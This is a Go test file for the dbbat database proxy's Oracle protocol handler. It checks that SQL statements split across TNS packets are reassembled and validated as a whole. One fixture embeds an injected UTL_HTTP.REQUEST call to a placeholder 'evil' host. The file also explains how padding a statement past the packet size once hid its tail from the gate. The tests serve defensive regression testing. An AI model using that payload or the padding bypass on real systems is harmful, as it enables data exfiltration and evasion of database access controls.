package oracle

import (
	"fmt"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/fclairamb/dbbat/internal/proxy/shared"
	"github.com/fclairamb/dbbat/internal/store"
)

// The wire facts this file is written against, all measured on the capture of
// the 2026-08-31 incident (connection 01a0585d-3486-724d-b769-1002c52ddcf2):
//
//   - the client fills each TNS Data packet to the negotiated SDU — 8192 bytes
//     including the 8-byte TNS header and the 2-byte data flags — and the last
//     fragment of a message is whatever is left;
//   - only the first fragment carries the TTC op header (`11 69` close-cursors
//     with `03 5e <exec>` stapled behind it); the continuation is raw
//     statement bytes behind the same header and data-flags prefix;
//   - the exec header declares the statement's byte length, and that length
//     (9214 in the incident) is what says the message does not fit its packet.
const testSDU = 8192

// oracleSDUFragment is the TTC payload size of a full first fragment: the SDU
// minus the TNS header and the data-flags prefix the probe writes.
const oracleSDUFragment = testSDU - tnsHeaderSize - ttcDataFlagsSize

// encodeCompressedInt encodes n the way TTC does — a byte count followed by the
// big-endian value — which is what execSQLLength reads for a statement longer
// than 255 bytes. buildPiggybackExec's single-byte spelling cannot express one.
func encodeCompressedInt(n int) []byte {
	if n == 0 {
		return []byte{0x00}
	}

	var digits []byte

	for v := n; v > 0; v >>= 8 {
		digits = append([]byte{byte(v & 0xff)}, digits...)
	}

	return append([]byte{byte(len(digits))}, digits...)
}

// buildLongPiggybackExec is buildPiggybackExec for a statement past 255 bytes:
// same header walk, with the declared length spelled as a multi-byte compressed
// int.
func buildLongPiggybackExec(sql string) []byte {
	out := make([]byte, 0, 64+len(sql))
	out = append(out, byte(TTCFuncPiggyback), PiggybackSubExecSQL, 0x00)
	out = append(out, 0x02, 0x81, 0x21) // options
	out = append(out, 0x00)             // cursor id 0
	out = append(out, 0x01)             // the cursor-id-is-zero flag
	out = append(out, encodeCompressedInt(len(sql))...)
	out = append(out, 0x01, 0x01, 0x0d)
	out = append(out, make([]byte, 24)...)
	out = append(out, sql...)
	out = append(out, 0x00, 0x00)

	return out
}

// buildLongJDBCExec is the incident's frame shape: a close-cursors list that
// walks (so the call is nameable and a refusal can be answered with an OER),
// with the real execute stapled behind it.
func buildLongJDBCExec(sql string) []byte {
	// 11 69 <seq> 00 | 01 pointer | 01 01 count=1 | 01 02 id=2 — the same
	// walkable list buildJDBCExec uses.
	closes := []byte{byte(TTCFuncOFETCH), execSubOpJDBC, 0x07, 0x00, 0x01, 0x01, 0x01, 0x01, 0x02}
	exec := buildLongPiggybackExec(sql)

	frame := make([]byte, 0, len(closes)+len(exec))
	frame = append(frame, closes...)

	return append(frame, exec...)
}

// mergeStatementBytes is the size mergeStatement generates up to: comfortably
// past one SDU-sized fragment, so the tail row always lands in a continuation.
const mergeStatementBytes = 9000

// mergeStatement builds a statement of the shape the incident produced: a
// generated MERGE whose literal values carry French labels, so the text is
// UTF-8 with accents past the first fragment and carries no dynamic SQL at all.
// tail is appended as the last row's label, which is where a test puts the thing
// the gate must see beyond the fragment boundary.
func mergeStatement(tail string) string {
	var b strings.Builder

	b.WriteString("MERGE INTO attribut_propriete d\nUSING (\n  SELECT 1 AS num_attr, 'Surface Pièce' AS lib FROM dual\n")

	for i := 2; b.Len() < mergeStatementBytes; i++ {
		fmt.Fprintf(&b, "  UNION ALL SELECT %d AS num_attr, 'Périmètre chauffé n°%d' AS lib FROM dual\n", i, i)
	}

	fmt.Fprintf(&b, "  UNION ALL SELECT 999 AS num_attr, '%s' AS lib FROM dual\n", tail)
	b.WriteString(") s ON (d.num_attr = s.num_attr)\nWHEN MATCHED THEN UPDATE SET d.lib = s.lib\n")

	return b.String()
}

// TestStatementFragmentShortfall states the trigger: reassembly starts exactly
// when a statement-carrying op's *declared* length runs past the bytes in hand,
// and never otherwise.
func TestStatementFragmentShortfall(t *testing.T) {
	t.Parallel()

	long := mergeStatement("ordinary")

	tests := []struct {
		name string
		ttc  []byte
		want bool
	}{
		{"a complete piggyback exec needs nothing", buildLongPiggybackExec(long), false},
		{"a complete JDBC exec needs nothing", buildLongJDBCExec(long), false},
		{"a complete small exec needs nothing", buildPiggybackExec("SELECT 1 FROM DUAL"), false},
		{"a complete OALL8 needs nothing", buildOALL8("SELECT 1 FROM DUAL", nil, 3), false},
		{"a fetch is not a statement op", []byte{byte(TTCFuncOFETCH), 0x05, 0x01}, false},
		{
			"a piggyback exec cut at the SDU needs the rest",
			buildLongPiggybackExec(long)[:oracleSDUFragment],
			true,
		},
		{
			"a JDBC exec cut at the SDU needs the rest",
			buildLongJDBCExec(long)[:oracleSDUFragment],
			true,
		},
		{
			"an OALL8 cut mid-statement needs the rest",
			buildOALL8(long, nil, 3)[:oracleSDUFragment],
			true,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()

			need, ok := statementFragmentShortfall(tc.ttc)
			require.Equal(t, tc.want, ok)

			if ok {
				assert.Positive(t, need, "a shortfall is a number of bytes still owed")
				assert.LessOrEqual(t, need, maxStatementReassembly)
			}
		})
	}
}

// TestFragmentedExecDecodesToTheWholeStatement is the decode half, stated
// without the relay: the first fragment on its own yields a mutilated prefix
// (which is what the gate used to enforce against), and the reassembled body
// yields the statement byte for byte — accents included.
func TestFragmentedExecDecodesToTheWholeStatement(t *testing.T) {
	t.Parallel()

	sql := mergeStatement("Fenêtre à l''étage")
	frame := buildLongJDBCExec(sql)

	require.Greater(t, len(frame), oracleSDUFragment,
		"the fixture has to be a message that does not fit one SDU-sized packet")

	// What the pre-fix gate saw: the first fragment alone.
	fragment := frame[:oracleSDUFragment]
	_, whole := decodeExecStatement(fragment)
	require.False(t, whole, "a fragment cannot yield the declared run — that is the bug")

	prefix, err := decodeExecSQL(fragment)
	require.NoError(t, err, "it degraded to the keyword scan instead of failing")
	assert.True(t, prefix.Truncated, "and the prefix now says so")
	assert.NotEqual(t, sql, prefix.SQL)

	// What the gate sees now.
	got, ok := decodeExecStatement(frame)
	require.True(t, ok)
	assert.Equal(t, sql, got, "the reassembled body decodes to the statement, accents intact")
}

// oracleFragmentedProbe is oracle19cProbe with the client writing one TTC
// message as several TNS Data packets, exactly as a client does past the SDU.
type oracleFragmentedProbe struct {
	*oracle19cProbe
}

// newFragmentedProbe replays the DBeaver 19c negotiation (the `11 69` client
// shape this incident happened on) and arms the session with grant.
func newFragmentedProbe(t *testing.T, grant *store.Grant) *oracleFragmentedProbe {
	t.Helper()

	return &oracleFragmentedProbe{oracle19cProbe: newOracle19cProbe(t, dbeaver19cDump, grant)}
}

// execFragmented writes ttc as SDU-sized packets, the way a client writes a
// message larger than the negotiated SDU. It returns the raw packets written,
// so a test can require the upstream to receive those very bytes back.
func (p *oracleFragmentedProbe) execFragmented(ttc []byte) [][]byte {
	p.t.Helper()

	var written [][]byte

	for start := 0; start < len(ttc); start += oracleSDUFragment {
		end := min(start+oracleSDUFragment, len(ttc))

		pkt := &TNSPacket{
			Type:    TNSPacketTypeData,
			Payload: append([]byte{0x00, 0x00}, ttc[start:end]...),
		}

		require.NoError(p.t, p.client.SetWriteDeadline(time.Now().Add(refusal19cDeadline)))
		require.NoError(p.t, writeTNSPacket(p.client, pkt))

		written = append(written, pkt.Encode())
	}

	require.Greater(p.t, len(written), 1, "the fixture must actually fragment")

	return written
}

// expectForwardedFragments requires the upstream to receive the client's own
// packets, in order and byte for byte. The reassembled buffer is a reading
// device: dbbat must never synthesize wire bytes toward the upstream.
func (p *oracleFragmentedProbe) expectForwardedFragments(written [][]byte) {
	p.t.Helper()

	for i, want := range written {
		require.NoError(p.t, p.upstream.SetReadDeadline(time.Now().Add(refusal19cDeadline)))

		pkt, err := readTNSPacket(p.upstream)
		require.NoError(p.t, err, "fragment %d never arrived upstream", i)
		assert.Equal(p.t, want, pkt.Raw, "fragment %d must travel unchanged", i)
	}
}

// TestFragmentedStatementIsGatedOnTheWholeStatement is the enforcement
// regression: a blocked pattern placed *beyond* the first fragment is refused
// post-fix. Before it, the gate only ever saw the padding and the statement
// traveled whole to the upstream.
//
// It also pins the two properties a refusal has to keep: every fragment is
// dropped (the pipe is unbuffered, so a proxy that forwarded one would be parked
// on that write and the refusal would never arrive), and the session survives to
// answer the next call.
func TestFragmentedStatementIsGatedOnTheWholeStatement(t *testing.T) {
	t.Parallel()

	// No grant controls at all: the Oracle pattern list is what refuses here,
	// which is precisely the enforcement a full-write grant still relies on.
	grant := &store.Grant{Definition: &store.GrantDefinition{}}
	p := newFragmentedProbe(t, grant)

	sql := mergeStatement("x' || UTL_HTTP.REQUEST('http://evil/') || '")
	require.Greater(t, strings.Index(sql, "UTL_HTTP"), oracleSDUFragment,
		"the blocked pattern has to sit past the first fragment or this proves nothing")

	// The bypass, stated: everything the pre-fix gate could see — the text
	// inside the first fragment — passes every control. Only the reassembled
	// statement carries the blocked pattern.
	visible := sql[:strings.LastIndex(sql[:oracleSDUFragment], "\n")]
	require.NoError(t, shared.ValidateOracleQuery(visible, grant),
		"padding a statement past the SDU used to hide its tail from every control")

	frame := buildLongJDBCExec(sql)
	p.execFragmented(frame)
	p.expectRefusal(frame, "not permitted through the proxy")

	// The session is alive: the next statement travels, unchanged.
	allowed := buildJDBCExec("SELECT 1 FROM DUAL")
	p.exec(allowed)
	p.expectForwarded(allowed)

	p.expectCleanEOF()
}

// TestFragmentedStatementIsForwardedWholeAndRecordedWhole is the allow half: a
// legitimate >8KB statement with accented literals — the incident's own traffic
// — reaches the upstream as the client's own packets, and the session records
// the whole statement rather than the fragment.
func TestFragmentedStatementIsForwardedWholeAndRecordedWhole(t *testing.T) {
	t.Parallel()

	grant := &store.Grant{Definition: &store.GrantDefinition{Controls: []string{store.ControlReadOnly}}}
	p := newFragmentedProbe(t, grant)

	sql := mergeStatement("Pièce d''eau — 3ᵉ étage")
	frame := buildLongJDBCExec("SELECT num_attr FROM (\n" + sql + ") WHERE 1 = 1")

	written := p.execFragmented(frame)
	p.expectForwardedFragments(written)

	// What /queries would hold: the pending query the gate started.
	p.session.trackerMu.Lock()
	pending := p.session.tracker.pendingQuery
	p.session.trackerMu.Unlock()

	require.NotNil(t, pending)
	require.NotNil(t, pending.cursor)
	assert.Contains(t, pending.cursor.sql, "Pièce d''eau — 3ᵉ étage",
		"the accented literal past the fragment boundary survives into the recorded text")
	assert.NotContains(t, pending.cursor.sql, partialStatementNote,
		"a statement dbbat read whole is not recorded as partial")
	assert.Greater(t, len(pending.cursor.sql), oracleSDUFragment)

	p.expectCleanEOF()
}

// TestPartialStatementIsNotGatedAsWhole covers the frames reassembly cannot fix
// — a statement dbbat holds only a prefix of. It must never go through the
// validators as if it were the statement: under a grant whose controls depend on
// reading it, it is refused, and refused with the error that names the actual
// problem rather than claiming nested dynamic SQL.
func TestPartialStatementIsNotGatedAsWhole(t *testing.T) {
	t.Parallel()

	// An OALL8 whose declared length runs past the frame: everything up to the
	// length parses, the statement text does not end. Cut outside any literal,
	// so the *only* thing refusing it can be the truncation itself.
	full := buildOALL8("SELECT lib FROM attribut WHERE num_attr = 1 AND parent = 2", nil, 4)
	partial := full[:len(full)-20]

	decoded, err := decodeOALL8(partial)
	require.NoError(t, err)
	require.True(t, decoded.Truncated, "the decoder has to say the text is a prefix")

	t.Run("refused under a grant whose controls need the statement", func(t *testing.T) {
		t.Parallel()

		s := newTestSession(&store.Grant{
			Definition: &store.GrantDefinition{Controls: []string{store.ControlReadOnly}},
		})

		err := s.handleOALL8(partial)
		require.ErrorIs(t, err, shared.ErrStatementNotFullyRead)
		require.NotErrorIs(t, err, shared.ErrDynamicSQLNotCheckable,
			"a truncated statement is not 'dynamic SQL built from dynamic SQL' — that misdiagnosis is the incident")
	})

	t.Run("forwarded but recorded as partial under a grant with no statement controls", func(t *testing.T) {
		t.Parallel()

		s := newTestSession(&store.Grant{Definition: &store.GrantDefinition{}})

		require.NoError(t, s.handleOALL8(partial))
		require.NotNil(t, s.tracker.pendingQuery)
		assert.Contains(t, s.tracker.pendingQuery.cursor.sql, partialStatementNote,
			"the queries row says the text is partial rather than passing a prefix off as the statement")
	})

	t.Run("a prefix cut inside a literal is refused whatever the grant says", func(t *testing.T) {
		t.Parallel()

		// The incident's own shape: the cut lands inside a quoted run, which no
		// grant can vouch for. Refused for that reason, and said so — this is
		// the fail-closed policy ValidateDynamicSQL has always applied, with
		// the misleading message replaced.
		quoted := buildOALL8("SELECT lib FROM attribut WHERE lib = 'Surface Pièce'", nil, 5)

		s := newTestSession(&store.Grant{Definition: &store.GrantDefinition{}})

		err := s.handleOALL8(quoted[:len(quoted)-12])
		require.ErrorIs(t, err, shared.ErrStatementNotFullyRead)
	})
}

// TestUnterminatedStatementIsNotReportedAsNestedDynamicSQL is the error split
// itself, at the Oracle validator: the exact text shape a statement cut at a
// fragment boundary takes (an open quoted run) used to come back as
// ErrDynamicSQLNotCheckable.
func TestUnterminatedStatementIsNotReportedAsNestedDynamicSQL(t *testing.T) {
	t.Parallel()

	grant := &store.Grant{Definition: &store.GrantDefinition{}}

	err := shared.ValidateOracleQuery("MERGE INTO t USING (SELECT 'Surface Pi", grant)
	require.ErrorIs(t, err, shared.ErrStatementNotFullyRead)
	require.NotErrorIs(t, err, shared.ErrDynamicSQLNotCheckable)
	assert.NotContains(t, err.Error(), "built from dynamic SQL")
}
